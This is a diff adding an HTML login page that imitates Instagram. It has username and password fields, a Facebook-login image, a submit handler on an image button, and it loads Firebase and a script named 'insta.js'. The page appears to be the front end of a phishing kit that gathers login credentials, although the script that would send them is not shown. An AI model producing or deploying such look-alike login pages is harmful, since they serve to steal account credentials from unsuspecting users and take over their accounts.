@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="./insta.css" />
+  </head>
+  <body>
+    <section class="main">
+      <div class="first-div">
+        <p id="main-p">English</p>
+        <img style="width: 60px; height: 40px" src="arrow.png" alt="" />
+      </div>
+
+      <div id="contactForm" class="container">
+        <img src="Screenshot (63).png" alt="" />
+        <img id="fb-login" src="fb-login.jpeg" alt="" />
+        <img src="1212.png" alt="" />
+        <div class="inputsss">
+          <input placeholder="Password" type="password" name="" id="inp1" />
+          <input
+            placeholder="Phone number, username, or email"
+            id="inp2"
+            type="text"
+            name=""
+          />
+          <p id="pass-forgot">Forgot password?</p>
+        </div>
+        <img
+          type="submit"
+          onclick="submitForm(event)"
+          id="login-btn"
+          src="login-btn.png"
+          alt=""
+        />
+        <p id="p-newAcc">Dont have account? <span id="signup"> Signup</span></p>
+      </div>
+      <script src="https://www.gstatic.com/firebasejs/4.3.0/firebase.js"></script>
+      <script src="insta.js"></script>
+    </section>
+  </body>
+</html>
